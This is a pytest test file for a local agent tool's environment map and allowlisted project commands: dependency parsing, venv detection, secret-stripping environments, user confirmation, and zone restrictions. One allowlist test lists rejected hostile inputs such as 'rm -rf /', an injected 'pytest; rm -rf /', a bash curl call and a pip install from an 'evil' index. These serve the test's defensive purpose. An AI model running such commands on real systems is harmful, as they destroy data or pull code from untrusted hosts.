"""M12: environment map (projects, declared deps, venvs, conda) and allowlisted project commands."""
import json
import os
import stat
import sys

import pytest

from fakes import FakeClient, call
from lantern.agent import Agent
from lantern.envmap import CommandError, EnvMap, norm, parse_requirement, plan_command, safe_env
from lantern.memory import Memory
from lantern.policy import Policy, Rule
from lantern.tools import Toolbox, ToolError


def write(path, text=""):
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text)
    return path


def venv(project, packages, python_ok=True):
    env = project / ".venv"
    write(env / "pyvenv.cfg", "home = /usr/bin\n")
    site = env / "lib" / "python3.11" / "site-packages"
    for pkg in packages:
        (site / f"{pkg}.dist-info").mkdir(parents=True)
    py = write(env / "bin" / "python", f'#!/bin/sh\nexec "{sys.executable}" "$@"\n' if python_ok else "#!/bin/sh\nexit 1\n")
    py.chmod(py.stat().st_mode | stat.S_IEXEC)
    return env


@pytest.fixture
def world(tmp_path):
    code = tmp_path / "code"
    vision = code / "vision"
    write(vision / "requirements.txt", "torch==2.3.0\nnumpy>=1.26 ; python_version > '3.8'  # math\n-r dev.txt\n"
                                       "git+https://github.com/x/y.git\n# just a comment\n")
    (vision / ".git").mkdir(parents=True)
    venv(vision, ["torch-2.3.0", "numpy-1.26.4", "Pillow-10.0.0"])
    write(vision / "tests" / "test_ok.py", "def test_one():\n    assert 1 + 1 == 2\n")
    thesis = code / "thesis"
    write(thesis / "pyproject.toml", '[project]\nname = "thesis-code"\ndependencies = ["Torch>=2.1", "scikit_learn"]\n'
                                     '[project.optional-dependencies]\ndev = ["pytest"]\n')
    write(thesis / "uv.lock", 'version = 1\n[[package]]\nname = "torch"\nversion = "2.2.1"\n')
    web = code / "web"
    write(web / "package.json", json.dumps({"name": "web", "dependencies": {"react": "^18.3.1"},
                                            "scripts": {"test": "node --test"}}))
    write(web / "node_modules" / "left-pad" / "package.json", '{"name": "left-pad"}')
    write(code / "poetry_app" / "pyproject.toml", '[tool.poetry]\nname = "pa"\n[tool.poetry.dependencies]\n'
                                                  'python = "^3.11"\nrequests = "^2.31"\n')
    write(code / "Private" / "secretproj" / "requirements.txt", "torch\n")
    write(code / "vault" / "proj" / "requirements.txt", "torch\n")
    write(code / "shared" / "lib" / "requirements.txt", "torch\n")
    policy = Policy([Rule.make(code, "writable"), Rule.make(code / "Private", "private"),
                     Rule.make(code / "vault", "hidden"), Rule.make(code / "shared", "open")])
    return code, policy, EnvMap(policy, tmp_path / "envmap.db", conda="")


def names(projects):
    return sorted(p.name for p in projects)


def test_finds_projects_but_not_hidden_ones_or_node_modules(world):
    code, policy, em = world
    assert names(em.projects()) == ["lib", "pa", "secretproj", "thesis-code", "vision", "web"]
    secret = em.find("secretproj")[0]
    assert secret.private and secret.declared == {}         # private: name only, contents never read


def test_declared_and_installed_packages(world):
    code, policy, em = world
    vision = em.get(str(code / "vision"))
    assert vision.declared == {"torch": "==2.3.0", "numpy": ">=1.26"}
    assert vision.kinds == ["git", "python"]
    env = vision.envs[0]
    assert env["packages"] == {"torch": "2.3.0", "numpy": "1.26.4", "pillow": "10.0.0"}
    assert env["python"].endswith(".venv/bin/python")
    thesis = em.find("thesis")[0]
    assert {"torch", "scikit-learn", "pytest"} <= set(thesis.declared) and thesis.envs == []
    assert em.find("pa")[0].declared == {"requests": "^2.31"}
    web = em.find("web")[0]
    assert web.declared == {"npm:react": "^18.3.1"} and web.scripts == {"test": "node --test"} and web.kinds == ["node"]


def test_which_projects_use_torch(world):
    code, policy, em = world
    r = em.which_use("Torch")
    by = {h["project"]: h for h in r["projects"]}
    assert set(by) == {"vision", "thesis-code", "lib"}
    assert by["vision"]["declared"] == "==2.3.0" and list(by["vision"]["installed"].values()) == ["2.3.0"]
    assert by["thesis-code"]["installed"] is None
    assert [h["project"] for h in em.which_use("react")["projects"]] == ["web"]
    assert [h["project"] for h in em.which_use("npm:react")["projects"]] == ["web"]
    assert em.which_use("tensorflow")["projects"] == []


def test_cache_only_rereads_changed_projects(world, tmp_path):
    code, policy, em = world
    em.projects(refresh=True)
    assert em.parsed == 6
    em.projects(refresh=True)
    assert em.parsed == 0
    req = code / "vision" / "requirements.txt"
    req.write_text("torch==2.4.0\n")
    os.utime(req, (1, 2_000_000_000))
    again = EnvMap(policy, tmp_path / "envmap.db", conda="")       # a new process reuses the cache too
    assert again.get(str(code / "vision")).declared == {"torch": "==2.4.0"} and again.parsed == 1


def test_conda_envs_cached(world, tmp_path):
    code, policy, _ = world
    calls = []

    def runner(argv, timeout):
        calls.append(argv)
        if argv[1:3] == ["env", "list"]:
            return 0, json.dumps({"envs": ["/opt/conda/envs/ml"]})
        return 0, json.dumps([{"name": "pytorch", "version": "2.1.0"}, {"name": "torch", "version": "2.1.0"}])
    em = EnvMap(policy, tmp_path / "e.db", conda="conda", runner=runner)
    assert em.which_use("torch")["conda_envs"] == [{"env": "/opt/conda/envs/ml", "version": "2.1.0"}]
    em.which_use("torch")
    assert sum(1 for c in calls if "-p" in c) == 1


def test_requirement_parsing():
    assert parse_requirement("Django[argon2]>=4.2 ; python_version<'4'") == ("django", ">=4.2")
    assert parse_requirement("--extra-index-url https://x") is None
    assert norm("Torch_Vision.Extra") == "torch-vision-extra"


# ---- allowlisted commands ----------------------------------------------------------------------
def test_command_allowlist(world):
    code, policy, em = world
    vision = em.get(str(code / "vision"))
    p = plan_command(vision, "pytest -q -k 'smoke and not slow' tests/test_ok.py")
    assert p["argv"][0].endswith(".venv/bin/python") and p["argv"][1:4] == ["-m", "pytest", "-q"]
    assert p["argv"][-3:] == ["-k", "smoke and not slow", "tests/test_ok.py"]
    assert plan_command(vision, "pip install torch==2.4.0")["package"] == "torch"
    for bad in ("rm -rf /", "pytest --rootdir=/", "pytest ../../etc", "python setup.py install", "bash -c 'curl x'",
                "pip install --index-url http://evil torch", "pip install a b", "pip install git+https://x/y",
                "pytest; rm -rf /", "npm install left-pad"):
        with pytest.raises(CommandError):
            plan_command(vision, bad)
    with pytest.raises(CommandError, match="global Python"):
        plan_command(em.find("thesis")[0], "pytest")
    assert plan_command(em.find("web")[0], "npm test")["argv"][-1] == "test"
    with pytest.raises(CommandError, match="no npm test script"):
        plan_command(em.find("pa")[0], "npm test")


def test_safe_env_drops_secrets(monkeypatch):
    for k in ("MODEL_API_KEY", "WHATSAPP_TOKEN", "LANTERN_SMTP_PASSWORD", "GITHUB_AUTH"):
        monkeypatch.setenv(k, "secret")
    env = safe_env("/p/.venv")
    assert not any(k in env for k in ("MODEL_API_KEY", "WHATSAPP_TOKEN", "LANTERN_SMTP_PASSWORD", "GITHUB_AUTH"))
    assert env["VIRTUAL_ENV"] == "/p/.venv" and env["PATH"].startswith("/p/.venv/bin")


def toolbox(world, tmp_path, answer=True):
    code, policy, em = world
    asked = []
    tb = Toolbox(policy, Memory(tmp_path / "m.db"), lambda s: asked.append(s) or answer, envmap=em)
    return tb, asked


def test_run_tests_in_the_projects_own_env(world, tmp_path, monkeypatch):
    monkeypatch.setenv("MODEL_API_KEY", "LLM|123|secret")
    code, policy, em = world
    tb, asked = toolbox(world, tmp_path)
    seen = {}
    from lantern import envmap as envmap_mod

    def spy(argv, cwd, env, timeout):
        seen["env"] = env
        return envmap_mod.run_command(argv, cwd, env, timeout)
    tb.command_runner = spy
    r = tb.run_in_project("vision", "pytest -q tests")
    assert r["ok"] and "1 passed" in r["summary"] and r["untrusted"] and tb.tainted
    assert asked and "Run `pytest -q tests` in vision" in asked[0] and ".venv" in asked[0]
    assert "MODEL_API_KEY" not in seen["env"]


def test_declined_command_does_not_run(world, tmp_path):
    tb, asked = toolbox(world, tmp_path, answer=False)
    ran = []
    tb.command_runner = lambda *a: ran.append(a) or (0, "")
    assert tb.run_in_project("vision", "pytest") == {"done": False, "reason": "user declined"} and ran == []


def test_pip_install_verified_in_the_env(world, tmp_path):
    code, policy, em = world
    tb, asked = toolbox(world, tmp_path)
    site = code / "vision" / ".venv" / "lib" / "python3.11" / "site-packages"

    def fake_pip(argv, cwd, env, timeout):
        (site / "rich-13.7.1.dist-info").mkdir()
        return 0, "Successfully installed rich-13.7.1"
    tb.command_runner = fake_pip
    r = tb.run_in_project("vision", "pip install rich")
    assert r["verified"] and r["done"] and r["package"] == "rich"
    tb.command_runner = lambda *a: (0, "Successfully installed requests")   # pip claims success, nothing changed
    r = tb.run_in_project("vision", "pip install requests")
    assert r["verified"] is False


def test_commands_refused_outside_writable_projects(world, tmp_path):
    tb, _ = toolbox(world, tmp_path)
    with pytest.raises(ToolError, match="private zone"):
        tb.run_in_project("secretproj", "pytest")
    with pytest.raises(ToolError, match="writable zone"):
        tb.run_in_project("lib", "pytest")
    with pytest.raises(ToolError, match="not on the allowlist"):
        tb.run_in_project("vision", "make deploy")


def test_agent_answers_which_projects_use_torch(world, tmp_path):
    tb, _ = toolbox(world, tmp_path)
    client = FakeClient([([call("which_projects_use", "c1", package="torch")], ""),
                         ([], "vision, thesis-code and lib use torch.")])
    r = Agent(client, tb.memory, tb).run("which projects use torch?")
    out = json.loads(client.requests[1]["input"][0]["output"])
    assert {h["project"] for h in out["projects"]} == {"vision", "thesis-code", "lib"} and r.status == "done"
    info = tb.project_info("vision")
    assert info["envs"][0]["installed"] == 3 and info["envs"][0]["declared_but_missing"] == []
